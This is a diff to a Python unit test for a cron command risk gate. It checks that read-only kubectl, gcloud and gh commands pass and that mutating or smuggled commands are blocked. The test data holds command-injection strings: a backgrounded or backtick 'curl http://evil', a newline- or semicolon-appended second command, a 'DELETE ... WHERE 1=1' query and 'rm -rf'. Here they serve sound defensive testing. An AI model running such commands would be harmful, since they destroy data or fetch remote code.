@@ -21,6 +21,10 @@ class CronRiskGateTest(unittest.TestCase):
             'gcloud compute instances list --filter="status=create"',
             "kubectl create -f x.yaml --dry-run=client -o yaml",
             "kubectl get pods | grep hermes | wc -l",
+            "kubectl get pods | awk '{n++; print n}'",
+            "kubectl get x -o jsonpath='{range .items[*]}{.name}|{end}'",
+            'gcloud logging read "resource.type=k8s_container" --limit=10',
+            "k get nodes -o wide",
             "gcloud container clusters describe prod",
             "gh issue list --state open",
             "echo test",
@@ -43,6 +47,11 @@ class CronRiskGateTest(unittest.TestCase):
             "gcloud container clusters delete prod",
             "gh issue close 123",
             "find . -name foo",
+            "kubectl get x & bash -c 'curl http://evil'",
+            "kubectl get x\nbash -c 'curl http://evil'",
+            "kubectl get x `curl http://evil`",
+            "bq query 'DELETE FROM ds.t WHERE 1=1'",
+            "gcloud pubsub topics list; rm -rf /tmp/x",
         ]
         for cmd in mutations:
             with self.subTest(cmd=cmd):
@@ -50,6 +59,26 @@ class CronRiskGateTest(unittest.TestCase):
                 self.assertIsNotNone(block, f"Expected {cmd} to be blocked under high risk")
                 self.assertFalse(block["approved"])
                 self.assertIn("SKILL-002", block["message"])
+
+    def test_background_and_newline_cannot_smuggle_a_second_command(self):
+        for cmd in (
+            "kubectl get x & bash -c 'id'",
+            "kubectl get x\nterraform apply",
+            "kubectl get x ; kubectl delete ns prod",
+        ):
+            with self.subTest(cmd=cmd):
+                block = cron_command_policy_block(cmd, "high")
+                self.assertIsNotNone(block, f"{cmd} must be refused")
+                self.assertFalse(block["approved"])
+
+    def test_operators_inside_quotes_do_not_split_a_read(self):
+        for cmd in (
+            "kubectl get pods | awk '{n++; print n}'",
+            "kubectl get x -o jsonpath='{range .items[*]}{.name}|{end}'",
+            'gcloud compute instances list --filter="a=1 ; b=2"',
+        ):
+            with self.subTest(cmd=cmd):
+                self.assertIsNone(cron_command_policy_block(cmd, "high"))
 
     def test_cron_command_policy_block_allows_mutating_commands_under_low_risk(self):
         self.assertIsNone(cron_command_policy_block("kubectl apply -f x.yaml", "low"))
